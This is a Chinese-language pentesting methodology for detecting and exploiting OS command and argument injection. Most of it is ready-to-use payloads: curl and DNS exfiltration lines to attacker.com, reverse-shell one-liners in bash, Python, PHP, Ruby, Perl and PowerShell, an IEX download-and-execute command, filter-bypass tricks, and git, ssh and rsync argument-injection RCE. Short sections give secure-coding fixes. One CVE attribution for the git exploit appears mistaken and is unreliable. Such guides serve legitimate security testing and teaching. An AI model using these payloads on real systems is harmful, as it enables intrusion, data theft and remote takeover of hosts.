# OS 命令注入检测与利用方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 OS 命令注入漏洞检测与利用流程，帮助发现和利用系统命令执行漏洞。

## 1.2 适用范围

本文档适用于所有可能执行系统命令的 Web 应用、API 接口，特别是那些调用系统命令、脚本或程序的功能点。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

OS 命令注入漏洞是指应用程序由于对用户可控的参数过滤不严，导致攻击者能够在操作系统的层面拼接并执行任意命令。

**本质问题**：应用层代码将用户输入作为系统命令的一部分进行执行，违背了"数据与代码分离"的原则。

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-78 | OS 命令注入 |
| CWE-77 | 命令注入 |
| CWE-88 | 参数注入 (Argument Injection) |
| CWE-94 | 代码注入 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 网络诊断 | Ping/Traceroute 测试 | IP/域名参数直接拼接 |
| 文件处理 | 压缩/解压/转换 | 文件名参数可控 |
| 系统管理 | 配置查询/修改 | 配置参数注入 |
| 日志查看 | 日志搜索/导出 | 日志路径/关键词注入 |
| 邮件发送 | 邮件功能 | 邮件参数注入 |
| 第三方组件 | Log4j/Fastjson 等 | 已知漏洞利用 |

## 2.3 漏洞发现方法

### 2.3.1 黑盒测试

**步骤 1：输入点识别**

关注以下类型的参数：
- IP 地址/域名
- 文件路径/文件名
- 系统配置参数
- 搜索关键词

**步骤 2：命令分隔符探测**

```bash
# 常见命令分隔符
;   |   ||   &&   &   $()   ``   %0a   %0d

# 探测 Payload
127.0.0.1; whoami
127.0.0.1 | whoami
127.0.0.1 && whoami
127.0.0.1 || whoami
127.0.0.1$(whoami)
127.0.0.1`whoami`
```

**步骤 3：时间延迟探测**

```bash
# Linux
127.0.0.1; sleep 5
127.0.0.1; ping -c 5 127.0.0.1

# Windows
127.0.0.1 & timeout /t 5
127.0.0.1 & ping -n 5 127.0.0.1
```

**步骤 4：带外检测（无回显场景）**

```bash
# DNSLog 检测
127.0.0.1; ping $(whoami).attacker.com

# HTTPLog 检测
127.0.0.1; curl http://attacker.com/$(whoami)

# 使用 DNSLog 平台
127.0.0.1; nslookup $(whoami).dnslog.cn
```

### 2.3.2 白盒测试

**代码审计要点**

```java
// ❌ 漏洞代码示例
String cmd = "ping -c 4 " + request.getParameter("ip");
Runtime.getRuntime().exec(cmd);

// ✅ 安全代码示例
String ip = request.getParameter("ip");
// 严格验证 IP 格式
if (!ip.matches("^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$")) {
    throw new IllegalArgumentException("Invalid IP");
}
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", ip);
pb.start();
```

**危险函数列表**

| 语言 | 危险函数 |
|-----|---------|
| Java | `Runtime.exec()`, `ProcessBuilder.start()` |
| PHP | `system()`, `exec()`, `passthru()`, `shell_exec()` |
| Python | `os.system()`, `subprocess.call()`, `eval()` |
| Node.js | `exec()`, `spawn()`, `execFile()` |
| Ruby | `system()`, `exec()`, `` ` `` |

## 2.4 漏洞利用方法

### 2.4.1 基础信息收集

```bash
# 操作系统信息
uname -a           # Linux
ver                # Windows
cat /etc/os-release

# 当前用户
whoami
id
net user           # Windows

# 目录信息
pwd
ls -la
dir                # Windows

# 网络信息
ifconfig
ip addr
ipconfig           # Windows

# 环境变量
env
set                # Windows
```

### 2.4.2 文件操作

```bash
# 读取文件
cat /etc/passwd
type C:\Windows\win.ini

# 搜索文件
find / -name "*.conf"
dir /s *.config

# 写入文件
echo "content" > /tmp/file
echo "content" >> /tmp/file  # 追加
```

### 2.4.3 建立反向 Shell

**Linux Bash**

```bash
# Bash TCP
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Bash UDP
bash -i >& /dev/udp/attacker_ip/4444 0>&1

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
php -r '$sock=fsockopen("attacker_ip",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("attacker_ip",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Perl
perl -e 'use Socket;$i="attacker_ip";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```

**Windows PowerShell**

```powershell
# PowerShell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker_ip/shell.ps1')"

# PowerShell 反向 Shell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('attacker_ip',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### 2.4.4 权限提升

```bash
# 检查 SUID 文件
find / -perm -u=s -type f 2>/dev/null

# 检查 sudo 权限
sudo -l

# 检查内核版本
uname -r
# 搜索对应版本的提权漏洞
```

## 2.5 漏洞利用绕过方法

### 2.5.1 字符过滤绕过

**空格绕过**

```bash
# Linux
${IFS}
$IFS$9
<
>
{command,argument}

# 示例
cat${IFS}/etc/passwd
cat</etc/passwd
```

**关键字绕过**

```bash
# 变量拼接
c=ca; t=t; $c$t /etc/passwd

# 双引号拼接
c""at /etc/passwd
ca''t /etc/passwd

# 反斜杠绕过
\c\a\t /etc/passwd

# Base64 编码
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
```

**路径绕过**

```bash
# 使用环境变量
$HOME/.bashrc
$PATH

# 通配符
/???/??t /???/p??s??
cat /etc/pass*
cat /etc/pass?d
```

### 2.5.2 命令长度限制绕过

```bash
# 分执行
cmd1; cmd2; cmd3

# 管道
cmd1 | cmd2

# 后台执行
cmd1 & cmd2

# 换行符
cmd1%0acmd2
```

### 2.5.3 无回显利用

**DNSLog 外带**

```bash
# 命令执行结果外带
whoami | curl http://$(whoami).attacker.com/

# 文件内容外带
cat /etc/passwd | base64 | curl -X POST -d @- http://attacker.com/
```

**时间盲注**

```bash
# 根据条件执行延迟
if [ "$(whoami)" = "root" ]; then sleep 5; fi
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | Payload | 说明 |
|-----|---------|------|
| 基础探测 | `; whoami` | 命令分隔符探测 |
| 时间延迟 | `; sleep 5` | 时间盲注 |
| 信息收集 | `; uname -a` | 系统信息 |
| 文件读取 | `; cat /etc/passwd` | 读取敏感文件 |
| 反向 Shell | `; bash -i >& /dev/tcp/ip/port 0>&1` | 建立反向 Shell |
| DNSLog | `; ping $(whoami).dnslog.cn` | 无回显检测 |

## 3.2 自动化工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| Commix | 自动化命令注入工具 | https://github.com/commixproject/commix |
| Burp Suite | 手动测试 | https://portswigger.net/burp |
| OWASP ZAP | 自动化扫描 | https://www.zaproxy.org/ |
| DNSLog | 带外检测平台 | http://dnslog.cn/ |

## 3.3 Argument Injection (CWE-88) 专项

### 3.3.1 漏洞原理

Argument Injection（参数注入）是指攻击者通过注入恶意参数来修改命令行为的攻击方式。与命令注入不同，参数注入不执行新命令，而是修改现有命令的参数。

**与命令注入的区别：**
| 特征 | 命令注入 | 参数注入 |
|-----|---------|---------|
| 执行新命令 | ✅ | ❌ |
| 修改现有命令参数 | ✅ | ✅ |
| 需要命令分隔符 | ✅ | ❌ |
| 利用空格/连字符 | ❌ | ✅ |

### 3.3.2 常见攻击场景

```bash
# Git 命令参数注入
# 原始命令：git clone $USER_INPUT
# 攻击：--upload-pack=malicious
git clone --upload-pack=malicious https://github.com/user/repo.git

# SSH 命令参数注入
# 原始命令：ssh $USER_INPUT
# 攻击：-oProxyCommand=malicious
ssh -oProxyCommand=malicious user@host

# Rsync 参数注入
# 原始命令：rsync -av $SOURCE $DEST
# 攻击：-e 'bash -c "malicious"'
rsync -av -e 'bash -c "malicious"' /source /dest

# Curl 参数注入
# 原始命令：curl $URL -o $OUTPUT
# 攻击：-K /etc/passwd
curl https://example.com -K /etc/passwd -o output
```

### 3.3.3 检测 Payload

```bash
# 连字符注入
--help
--version
-v

# 配置文件注入
-K /etc/passwd
--config /etc/passwd

# 代理注入
--proxy http://attacker.com
-oProxyCommand=malicious

# 上传/下载注入
--upload-pack=malicious
--receive-pack=malicious
```

### 3.3.4 利用方法

**Git 参数注入 RCE**
```bash
# CVE-2022-24765 Git 参数注入
git clone --upload-pack='touch /tmp/pwned' https://github.com/user/repo.git

# 完整 RCE
git clone --upload-pack='bash -i >& /dev/tcp/attacker/4444 0>&1' https://github.com/user/repo.git
```

**SSH 参数注入**
```bash
# ProxyCommand 执行命令
ssh -oProxyCommand='bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"' user@host

# 使用 IdentityFile 读取敏感文件
ssh -i /etc/shadow user@host
```

**Rsync 参数注入**
```bash
# 通过 -e 参数执行命令
rsync -av -e 'bash -c "id"' /source /dest

# 通过 --rsync-path 执行命令
rsync -av --rsync-path='id; rsync' /source /dest
```

**Curl 参数注入**
```bash
# 读取配置文件
curl https://example.com -K /etc/passwd

# SSRF
curl --proxy http://169.254.169.254 http://example.com

# 文件覆盖
curl https://example.com -o /var/www/html/shell.php
```

### 3.3.5 修复建议

```bash
# ✅ 安全做法：使用 -- 分隔选项和参数
git clone -- "$USER_INPUT"

# ✅ 安全做法：使用数组传递参数
args=("$USER_INPUT")
git clone "${args[@]}"

# ✅ 安全做法：白名单验证
if [[ "$input" =~ ^[a-zA-Z0-9_-]+$ ]]; then
    git clone "$input"
fi

# ❌ 危险做法：直接拼接
git clone $USER_INPUT
```

## 3.4 修复建议

1. **避免使用系统命令** - 尽可能使用语言内置函数
2. **输入验证** - 严格验证所有用户输入
3. **参数化执行** - 使用参数数组而非字符串拼接
4. **最小权限原则** - 应用使用最小必要权限运行
5. **沙箱隔离** - 在容器或沙箱中执行命令
6. **使用--分隔符** - 防止参数注入

---

**参考资源**：
- [OWASP Cheat Sheet: OS Command Injection](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [PortSwigger - OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [PayloadAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
